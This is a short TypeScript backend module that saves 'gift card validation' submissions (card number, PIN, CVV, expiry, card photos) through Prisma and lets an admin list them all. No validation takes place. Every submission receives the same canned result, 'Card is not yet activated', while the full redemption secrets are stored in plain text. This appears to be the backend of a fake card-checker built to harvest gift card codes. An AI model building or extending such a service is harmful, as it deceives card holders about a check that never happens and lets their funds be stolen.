import prisma from '../database/prisma.ts';

export interface CreateValidationInput {
  brand: string;
  cardNumber: string;
  pin?: string;
  cvv?: string;
  expiryDate?: string;
  images?: string[];
  currency?: string;
  cardAmount?: number;
}

export async function createValidationRequest(input: CreateValidationInput) {
  const imagesClean = Array.isArray(input.images)
    ? input.images.filter((img) => typeof img === 'string' && img.trim().length > 0).slice(0, 3)
    : [];

  const validation = await prisma.giftCardValidation.create({
    data: {
      brand: input.brand.trim(),
      cardNumber: input.cardNumber.trim(),
      pin: input.pin ? input.pin.trim() : null,
      cvv: input.cvv ? input.cvv.trim() : null,
      expiryDate: input.expiryDate ? input.expiryDate.trim() : null,
      images: imagesClean,
      currency: input.currency ? input.currency.trim() : 'USD',
      cardAmount: typeof input.cardAmount === 'number' ? input.cardAmount : 0.0,
      status: 'PENDING',
      result: 'Card is not yet activated',
    },
  });
  return validation;
}

export async function getAdminValidations() {
  const validations = await prisma.giftCardValidation.findMany({
    orderBy: { createdAt: 'desc' },
  });
  return validations;
}

